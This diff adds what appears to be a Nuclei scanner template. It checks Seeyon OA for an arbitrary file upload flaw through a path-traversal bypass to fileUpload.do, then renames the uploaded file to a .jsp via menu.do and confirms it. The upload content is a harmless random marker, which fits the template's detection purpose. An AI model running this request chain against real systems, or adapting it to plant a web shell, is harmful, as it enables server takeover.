@@ -1,0 +1,100 @@
+id: poc-yaml-seeyon-fileupload-do-anyfile-upload
+info:
+  name: Seeyon OA fileUpload.do Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload, critical
+  description: |
+    A critical arbitrary file upload vulnerability in Seeyon OA fileUpload.do endpoint.
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |-
+      --00content0boundary00
+      Content-Disposition: form-data; name="type"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="extensions"
+
+      png
+      --00content0boundary00
+      Content-Disposition: form-data; name="applicationCategory"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="destDirectory"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="destFilename"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="maxSize"
+
+
+      --00content0boundary00
+      Content-Disposition: form-data; name="isEncrypt"
+
+      false
+      --00content0boundary00
+      Content-Disposition: form-data; name="file1"; filename="1.png"
+      Content-Type: application/pdf
+
+      {{t2}}
+      --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "fileurls"
+    extractors:
+      - type: regex
+        name: file_id
+        part: body
+        regex:
+          - "(?P<id>-?[0-9]{16,20})"
+        internal: true
+
+  - id: menu-upload
+    method: POST
+    path:
+      - /seeyon/autoinstall.do/../../seeyon/privilege/menu.do
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: method=uploadMenuIcon&fileid={{file_id}}&filename={{t1}}.jsp
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - /seeyon/main/menuIcon/{{t1}}.jsp
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
